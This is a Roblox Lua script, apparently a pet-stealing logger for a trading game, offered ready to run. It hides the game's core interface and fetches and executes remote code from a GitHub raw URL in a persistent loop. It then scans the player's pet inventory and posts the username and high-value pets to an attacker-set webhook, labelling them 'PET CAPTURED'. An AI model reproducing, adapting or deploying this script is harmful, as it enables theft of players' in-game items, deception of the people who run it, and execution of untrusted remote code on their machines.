-- [[ MONDEUR ELITE v17.7 - "ISSUE" PERSISTENT ]] --
if getgenv().MondeurExecuted then return end
getgenv().MondeurExecuted = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- 1. THE "LIFE SUPPORT" UI GUARD
local function LoadMondeurUI()
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
        if ui then
            ui.Name = "MondeurHub"
            ui.DisplayOrder = 2147483647
            ui.ResetOnSpawn = false -- Crucial: UI stays even if you die
        end
    end)
end

task.spawn(function()
    LoadMondeurUI()
    -- Loop to ensure the UI stays if the app is minimized/maximized
    while task.wait(1) do
        if not LocalPlayer.PlayerGui:FindFirstChild("MondeurHub") then
            LoadMondeurUI()
        end
    end
end)

-- 2. THE PROVEN LOGGING LOGIC
local function SendLog(title, pet, val)
    local payload = HttpService:JSONEncode({
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = "User: **" .. LocalPlayer.Name .. "**",
            ["fields"] = {
                {["name"] = "Pet Detected", ["value"] = pet, ["inline"] = true},
                {["name"] = "Arfud Points", ["value"] = tostring(val), ["inline"] = true}
            },
            ["color"] = 0x00FF00,
            ["footer"] = {["text"] = "Mondeur Elite v17.7 | " .. os.date("%X")}
        }}
    })
    
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        task.spawn(function()
            pcall(function() req({Url = getgenv().WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) end)
        end)
    end
end

-- 3. THE "DEEP SCAN"
task.spawn(function()
    task.wait(6) -- Give the UI a 6s headstart
    SendLog("📡 SYSTEM ACTIVE", "Issue Build v17.7", 0)

    pcall(function()
        local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
        local data = ClientData.get_data()
        local petPath = data.inventory and (data.inventory.inventory_pets or data.inventory.pets)
        
        if petPath then
            for _, pet in pairs(petPath) do
                local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
                if val >= (getgenv().THRESHOLD or 0) then
                    SendLog("✅ PET CAPTURED", pet.config_name or "Unknown", val)
                end
            end
        end
    end)
end)
